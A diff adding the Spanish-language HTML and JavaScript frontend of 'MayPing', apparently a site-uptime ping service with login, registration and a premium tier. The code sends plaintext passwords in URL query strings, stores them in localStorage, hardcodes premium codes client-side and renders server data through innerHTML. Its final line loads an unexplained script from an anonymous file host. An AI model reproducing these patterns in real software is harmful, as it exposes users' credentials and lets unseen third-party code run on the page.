@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MayPing - Servicio de Monitoreo</title>
+    <style>
+        :root {
+            --bg-color: #111;
+            --text-color: #f5f5f5;
+            --accent-color: #747474;
+            --highlight-color: #9e9e9e;
+            --border-radius: 8px;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 0h100v100H0z' fill='%23111111'/%3E%3Cpath d='M0 0h50v50H0z' fill='%23151515'/%3E%3Cpath d='M50 50h50v50H50z' fill='%23151515'/%3E%3C/svg%3E");
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        .metallic {
+            background: linear-gradient(145deg, #2a2a2a, #151515);
+            border: 1px solid #252525;
+            box-shadow: var(--shadow);
+        }
+
+        header {
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        header h1 {
+            font-size: 3rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            background: linear-gradient(90deg, #9e9e9e, #f5f5f5, #747474);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        header p {
+            color: var(--accent-color);
+            font-size: 1.2rem;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: linear-gradient(145deg, #1e1e1e, #0a0a0a);
+            border-radius: var(--border-radius);
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 1px solid #2a2a2a;
+            box-shadow: var(--shadow);
+        }
+
+        .form-container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--accent-color);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: var(--border-radius);
+            border: 1px solid #333;
+            background-color: rgba(30, 30, 30, 0.8);
+            color: var(--text-color);
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--highlight-color);
+            box-shadow: 0 0 0 2px rgba(158, 158, 158, 0.3);
+        }
+
+        button {
+            display: inline-block;
+            padding: 12px 25px;
+            border: none;
+            border-radius: var(--border-radius);
+            background: linear-gradient(145deg, #555, #333);
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+        }
+
+        button:hover {
+            background: linear-gradient(145deg, #666, #444);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .screens > div {
+            display: none;
+        }
+
+        .screens > div.active {
+            display: block;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            gap: 10px;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            border-radius: var(--border-radius);
+            background: #222;
+            color: var(--accent-color);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .tab-button.active {
+            background: linear-gradient(145deg, #444, #333);
+            color: white;
+        }
+
+        .ping-item {
+            background: linear-gradient(145deg, #1a1a1a, #0d0d0d);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 15px;
+            border: 1px solid #252525;
+        }
+
+        .ping-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .ping-name {
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .ping-url {
+            color: var(--accent-color);
+            word-break: break-all;
+        }
+
+        .ping-time {
+            color: var(--highlight-color);
+        }
+
+        .premium-banner {
+            background: linear-gradient(145deg, #444, #222);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #555;
+        }
+
+        .plan-selector {
+            margin-bottom: 20px;
+        }
+
+        .plan-option {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .plan-option input[type="radio"] {
+            width: auto;
+            margin-right: 10px;
+        }
+
+        .plan-details {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(40, 40, 40, 0.5);
+            border-radius: var(--border-radius);
+        }
+
+        .premium-code {
+            margin-top: 15px;
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            z-index: 1000;
+            animation: fadeIn 0.3s, fadeOut 0.3s 2.7s;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+
+        .toast.success {
+            border-left: 4px solid #4caf50;
+        }
+
+        .toast.error {
+            border-left: 4px solid #f44336;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        @media (max-width: 768px) {
+            header h1 {
+                font-size: 2.5rem;
+            }
+
+            .card {
+                padding: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            header h1 {
+                font-size: 2rem;
+            }
+
+            .tabs {
+                flex-direction: column;
+            }
+
+            .card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="metallic">
+        <h1>MayPing</h1>
+        <p>Monitoreo de servicios simple y eficiente</p>
+    </header>
+
+    <div class="container">
+        <div class="screens">
+            <!-- Pantalla de Login -->
+            <div id="login-screen" class="active">
+                <div class="card form-container">
+                    <h2>Iniciar sesión</h2>
+                    <form id="login-form">
+                        <div class="form-group">
+                            <label for="login-user">Usuario</label>
+                            <input type="text" id="login-user" placeholder="Ingresa tu usuario" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="login-password">Contraseña</label>
+                            <input type="password" id="login-password" placeholder="Ingresa tu contraseña" required>
+                        </div>
+                        <div class="form-group">
+                            <button type="submit">Iniciar sesión</button>
+                        </div>
+                    </form>
+                    <p style="text-align: center; margin-top: 20px;">
+                        ¿No tienes cuenta? <a href="#" id="go-to-register" style="color: var(--highlight-color);">Regístrate</a>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Pantalla de Registro -->
+            <div id="register-screen">
+                <div class="card form-container">
+                    <h2>Registrarse</h2>
+                    <form id="register-form">
+                        <div class="form-group">
+                            <label for="register-user">Usuario</label>
+                            <input type="text" id="register-user" placeholder="Crea un usuario" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="register-password">Contraseña</label>
+                            <input type="password" id="register-password" placeholder="Crea una contraseña" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="register-confirm-password">Confirmar contraseña</label>
+                            <input type="password" id="register-confirm-password" placeholder="Confirma tu contraseña" required>
+                        </div>
+                        <div class="form-group">
+                            <button type="submit">Registrarse</button>
+                        </div>
+                    </form>
+                    <p style="text-align: center; margin-top: 20px;">
+                        ¿Ya tienes cuenta? <a href="#" id="go-to-login" style="color: var(--highlight-color);">Inicia sesión</a>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Pantalla Principal Dashboard -->
+            <div id="dashboard-screen">
+                <div class="tabs">
+                    <div class="tab-button active" data-tab="pings">Mis Pings</div>
+                    <div class="tab-button" data-tab="create">Crear Ping</div>
+                    <div class="tab-button" data-tab="account">Mi Cuenta</div>
+                </div>
+
+                <!-- Tab de Mis Pings -->
+                <div id="pings-tab" class="tab-content active">
+                    <div class="card">
+                        <h2>Mis Pings</h2>
+                        <div id="pings-list">
+                            <div class="loading">Cargando tus pings...</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Tab de Crear Ping -->
+                <div id="create-tab" class="tab-content hidden">
+                    <div class="card">
+                        <h2>Crear Nuevo Ping</h2>
+                        <div class="plan-selector">
+                            <div class="plan-option">
+                                <input type="radio" id="free-plan" name="plan" value="free" checked>
+                                <label for="free-plan">Plan Free</label>
+                            </div>
+                            <div class="plan-option">
+                                <input type="radio" id="premium-plan" name="plan" value="premium">
+                                <label for="premium-plan">Plan Premium</label>
+                            </div>
+                            
+                            <div id="free-plan-details" class="plan-details">
+                                <p>Con el plan Free puedes crear pings con intervalos fijos:</p>
+                                <ul style="margin-left: 20px;">
+                                    <li>30 minutos</li>
+                                    <li>40 minutos</li>
+                                    <li>50 minutos</li>
+                                    <li>60 minutos</li>
+                                </ul>
+                            </div>
+                            
+                            <div id="premium-plan-details" class="plan-details hidden">
+                                <p>Con el plan Premium puedes crear pings con cualquier intervalo de tiempo.</p>
+                                <div class="premium-code">
+                                    <label for="premium-code">Ingresa tu código Premium:</label>
+                                    <input type="text" id="premium-code" placeholder="Código Premium">
+                                </div>
+                            </div>
+                        </div>
+
+                        <form id="create-ping-form">
+                            <div class="form-group">
+                                <label for="ping-name">Nombre del Ping</label>
+                                <input type="text" id="ping-name" placeholder="Nombre descriptivo para tu ping" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="ping-url">URL a monitorear</label>
+                                <input type="url" id="ping-url" placeholder="https://ejemplo.com" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="ping-interval">Intervalo (minutos)</label>
+                                <select id="ping-interval" required>
+                                    <option value="10">10 minutos</option>
+                                    <option value="20">20 minutos</option>
+                                    <option value="30">30 minutos</option>
+                                    <option value="40">40 minutos</option>
+                                    <option value="50">50 minutos</option>
+                                    <option value="60">60 minutos</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <button type="submit">Crear Ping</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Tab de Mi Cuenta -->
+                <div id="account-tab" class="tab-content hidden">
+                    <div class="card">
+                        <h2>Mi Cuenta</h2>
+                        <div id="user-info">
+                            <div class="form-group">
+                                <label>Usuario</label>
+                                <p id="account-username" style="color: var(--highlight-color);"></p>
+                            </div>
+                            <div class="form-group">
+                                <label>Total de Pings</label>
+                                <p id="account-total-pings" style="color: var(--highlight-color);"></p>
+                            </div>
+                            <div id="premium-status" class="premium-banner hidden">
+                                <h3>¡Eres usuario Premium!</h3>
+                                <p>Disfruta de todos los beneficios de MayPing.</p>
+                            </div>
+                            <div class="form-group">
+                                <button id="logout-button">Cerrar sesión</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // Configuración de la aplicación
+        const API_BASE_URL = 'https://pingserver-tr0e.onrender.com';
+        const PREMIUM_CODES = ['maypremium', 'maypm'];
+        
+        // Estado de la aplicación
+        const state = {
+            currentUser: null,
+            isPremium: false,
+            pings: []
+        };
+
+        // Referencias a elementos del DOM
+        const screens = {
+            login: document.getElementById('login-screen'),
+            register: document.getElementById('register-screen'),
+            dashboard: document.getElementById('dashboard-screen')
+        };
+
+        const tabs = {
+            pings: document.getElementById('pings-tab'),
+            create: document.getElementById('create-tab'),
+            account: document.getElementById('account-tab')
+        };
+
+        // Funciones de navegación
+        function showScreen(screenId) {
+            Object.values(screens).forEach(screen => {
+                screen.classList.remove('active');
+            });
+            screens[screenId].classList.add('active');
+        }
+
+        function showTab(tabId) {
+            Object.values(tabs).forEach(tab => {
+                tab.classList.add('hidden');
+                tab.classList.remove('active');
+            });
+            tabs[tabId].classList.remove('hidden');
+            tabs[tabId].classList.add('active');
+            
+            // Actualizar clase active en botones de tabs
+            document.querySelectorAll('.tab-button').forEach(button => {
+                if (button.dataset.tab === tabId) {
+                    button.classList.add('active');
+                } else {
+                    button.classList.remove('active');
+                }
+            });
+        }
+
+        // Función para mostrar toast (notificaciones)
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            toast.className = 'toast';
+            toast.classList.add(type);
+            toast.textContent = message;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Funciones para API
+        async function loginUser(username, password) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/LogIn?User=${username}&password=${password}`);
+                const data = await response.text();
+                
+                if (response.ok) {
+                    state.currentUser = {
+                        username,
+                        password
+                    };
+                    localStorage.setItem('user', JSON.stringify(state.currentUser));
+                    await fetchUserStatus();
+                    showScreen('dashboard');
+                    showTab('pings');
+                    showToast('Inicio de sesión exitoso');
+                    return true;
+                } else {
+                    showToast(data || 'Error al iniciar sesión', 'error');
+                    return false;
+                }
+            } catch (error) {
+                showToast('Error de conexión al servidor', 'error');
+                console.error(error);
+                return false;
+            }
+        }
+
+        async function registerUser(username, password) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/register?user=${username}&password=${password}`);
+                const data = await response.text();
+                
+                if (response.ok) {
+                    showToast('Registro exitoso');
+                    await loginUser(username, password);
+                    return true;
+                } else {
+                    showToast(data || 'Error al registrar usuario', 'error');
+                    return false;
+                }
+            } catch (error) {
+                showToast('Error de conexión al servidor', 'error');
+                console.error(error);
+                return false;
+            }
+        }
+
+        async function createPing(name, url, minutes) {
+            if (!state.currentUser) {
+                showToast('Debes iniciar sesión', 'error');
+                return false;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/ping?User=${state.currentUser.username}&password=${state.currentUser.password}&url=${url}&minutes=${minutes}&name=${name}`);
+                const data = await response.text();
+                
+                if (response.ok) {
+                    showToast('Ping creado correctamente');
+                    await fetchUserStatus();
+                    showTab('pings');
+                    return true;
+                } else {
+                    showToast(data || 'Error al crear ping', 'error');
+                    return false;
+                }
+            } catch (error) {
+                showToast('Error de conexión al servidor', 'error');
+                console.error(error);
+                return false;
+            }
+        }
+
+        async function fetchUserStatus() {
+            if (!state.currentUser) return;
+            
+            try {
+                const response = await fetch(`${API_BASE_URL}/status?user=${state.currentUser.username}&password=${state.currentUser.password}`);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    state.pings = data.pings || [];
+                    
+                    // Actualizar información de la cuenta
+                    document.getElementById('account-username').textContent = data.user;
+                    document.getElementById('account-total-pings').textContent = data.total_pings;
+                    
+                    // Renderizar la lista de pings
+                    renderPingsList();
+                    return true;
+                } else {
+                    const errorText = await response.text();
+                    console.error('Error fetching user status:', errorText);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error de conexión al obtener estado del usuario:', error);
+                return false;
+            }
+        }
+
+        // Funciones de renderizado
+        function renderPingsList() {
+            const pingsList = document.getElementById('pings-list');
+            
+            if (state.pings.length === 0) {
+                pingsList.innerHTML = '<p>No tienes pings activos. Crea uno nuevo en la pestaña "Crear Ping".</p>';
+                return;
+            }
+            
+            pingsList.innerHTML = '';
+            
+            state.pings.forEach(ping => {
+                const pingItem = document.createElement('div');
+                pingItem.className = 'ping-item';
+                pingItem.innerHTML = `
+                    <div class="ping-header">
+                        <span class="ping-name">${ping.name}</span>
+                        <span class="ping-time">${ping.minutes} min</span>
+                    </div>
+                    <div class="ping-url">${ping.url}</div>
+                `;
+                pingsList.appendChild(pingItem);
+            });
+        }
+
+        // Event Listeners
+        document.getElementById('go-to-register').addEventListener('click', e => {
+            e.preventDefault();
+            showScreen('register');
+        });
+
+        document.getElementById('go-to-login').addEventListener('click', e => {
+            e.preventDefault();
+            showScreen('login');
+        });
+
+        document.getElementById('login-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            const username = document.getElementById('login-user').value;
+            const password = document.getElementById('login-password').value;
+            await loginUser(username, password);
+        });
+
+        document.getElementById('register-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            const username = document.getElementById('register-user').value;
+            const password = document.getElementById('register-password').value;
+            const confirmPassword = document.getElementById('register-confirm-password').value;
+            
+            if (password !== confirmPassword) {
+                showToast('Las contraseñas no coinciden', 'error');
+                return;
+            }
+            
+            await registerUser(username, password);
+        });
+
+        document.getElementById('logout-button').addEventListener('click', () => {
+            state.currentUser = null;
+            state.isPremium = false;
+            localStorage.removeItem('user');
+            showScreen('login');
+            document.getElementById('login-form').reset();
+            showToast('Has cerrado sesión');
+        });
+
+        // Función para validar y activar Plan Premium
+        function validatePremiumCode() {
+            const premiumCode = document.getElementById('premium-code').value.trim().toLowerCase();
+            const isPremiumValid = PREMIUM_CODES.includes(premiumCode);
+            
+            if (isPremiumValid) {
+                state.isPremium = true;
+                
+                // Cambiar las opciones del select para plan premium
+                const intervalSelect = document.getElementById('ping-interval');
+                if (intervalSelect) {
+                    intervalSelect.innerHTML = `
+                        <option value="1">1 minuto</option>
+                        <option value="5">5 minutos</option>
+                        <option value="10">10 minutos</option>
+                        <option value="15">15 minutos</option>
+                        <option value="20">20 minutos</option>
+                        <option value="30">30 minutos</option>
+                        <option value="60">60 minutos</option>
+                        <option value="120">120 minutos</option>
+                        <option value="custom">Personalizado</option>
+                    `;
+                }
+                
+                showToast('¡Código Premium válido!', 'success');
+                document.getElementById('premium-status').classList.remove('hidden');
+            } else if (premiumCode) {
+                showToast('Código Premium inválido', 'error');
+                state.isPremium = false;
+                
+                // Restablecer a opciones free si el código es inválido
+                const intervalSelect = document.getElementById('ping-interval');
+                if (intervalSelect) {
+                    intervalSelect.innerHTML = `
+                        <option value="30">30 minutos</option>
+                        <option value="40">40 minutos</option>
+                        <option value="50">50 minutos</option>
+                        <option value="60">60 minutos</option>
+                    `;
+                }
+            }
+            
+            return isPremiumValid;
+        }
+        
+        // Añadir validación en tiempo real para el código premium
+        document.getElementById('premium-code').addEventListener('input', function() {
+            if (this.value.trim().length >= 3) {
+                validatePremiumCode();
+            }
+        });
+        
+        document.getElementById('premium-code').addEventListener('blur', validatePremiumCode);
+        
+
+        document.getElementById('premium-plan').addEventListener('change', () => {
+            document.getElementById('premium-plan-details').classList.remove('hidden');
+            document.getElementById('free-plan-details').classList.add('hidden');
+            document.getElementById('premium-code').value = ''; // Limpiar código previo
+            
+            // Reiniciar el estado de premium (requiere verificación)
+            state.isPremium = false;
+            
+            // Permitir cualquier valor para premium, pero solo se aplicará si el código es válido
+            const intervalSelect = document.getElementById('ping-interval');
+            intervalSelect.innerHTML = `
+                <option value="30">30 minutos</option>
+                <option value="40">40 minutos</option>
+                <option value="50">50 minutos</option>
+                <option value="60">60 minutos</option>
+                <option value="custom">Personalizado</option>
+            `;
+            
+            // Agregar evento de una sola vez
+            if (!intervalSelect.hasAttribute('premium-listener')) {
+                intervalSelect.setAttribute('premium-listener', 'true');
+                intervalSelect.addEventListener('change', function() {
+                    if (this.value === 'custom') {
+                        // Reemplazar el select con un input para valor personalizado
+                        const parent = this.parentElement;
+                        const input = document.createElement('input');
+                        input.type = 'number';
+                        input.id = 'ping-interval-custom';
+                        input.min = 30; // Valor mínimo por defecto
+                        input.max = 100000;
+                        input.value = 30; // Valor por defecto
+                        input.placeholder = 'Mínimo 30 minutos';
+                        input.required = true;
+                        parent.replaceChild(input, this);
+                    }
+                });
+            }
+        });
+
+        document.getElementById('create-ping-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            
+            // Obtener el nombre y la URL
+            const name = document.getElementById('ping-name').value;
+            const url = document.getElementById('ping-url').value;
+            
+            // Obtener el intervalo según el tipo de input que esté presente
+            let minutes;
+            const customInterval = document.getElementById('ping-interval-custom');
+            if (customInterval) {
+                minutes = customInterval.value;
+            } else {
+                minutes = document.getElementById('ping-interval').value;
+            }
+            
+            // Validar si es usuario premium primero
+            let isPremiumValid = false;
+            
+            if (document.getElementById('premium-plan').checked) {
+                const premiumCode = document.getElementById('premium-code').value.trim().toLowerCase();
+                
+                if (!premiumCode) {
+                    showToast('Debes ingresar un código Premium', 'error');
+                    return;
+                }
+                
+                if (!PREMIUM_CODES.includes(premiumCode)) {
+                    showToast('Código Premium inválido', 'error');
+                    return;
+                }
+                
+                // Solo si el código es válido, activar el premium
+                isPremiumValid = true;
+                state.isPremium = true;
+                document.getElementById('premium-status').classList.remove('hidden');
+            }
+            
+            // Validar el intervalo según el plan
+            if (!isPremiumValid && parseInt(minutes) < 30) {
+                showToast('El plan Free solo permite intervalos de 30 minutos o más', 'error');
+                return;
+            }
+            
+            // Validar que no excede el máximo para premium
+            if (parseInt(minutes) > 100000) {
+                showToast('El intervalo máximo permitido es de 100000 minutos', 'error');
+                return;
+            }
+            
+            await createPing(name, url, minutes);
+        });
+
+        // Navegación entre tabs
+        document.querySelectorAll('.tab-button').forEach(button => {
+            button.addEventListener('click', () => {
+                showTab(button.dataset.tab);
+            });
+        });
+
+        // Inicialización
+        function init() {
+            // Comprobar si hay un usuario almacenado
+            const savedUser = localStorage.getItem('user');
+            if (savedUser) {
+                try {
+                    state.currentUser = JSON.parse(savedUser);
+                    fetchUserStatus().then(success => {
+                        if (success) {
+                            showScreen('dashboard');
+                            showTab('pings');
+                        } else {
+                            // Si hay un error al obtener el estado, volver al login
+                            localStorage.removeItem('user');
+                            showScreen('login');
+                        }
+                    });
+                } catch (e) {
+                    localStorage.removeItem('user');
+                    showScreen('login');
+                }
+            } else {
+                showScreen('login');
+            }
+        }
+
+        // Iniciar la aplicación
+        init();
+    </script>
+    <script type="text/javascript" src="https://files.catbox.moe/mqzcek.js"></script>
+</body>
+</html>
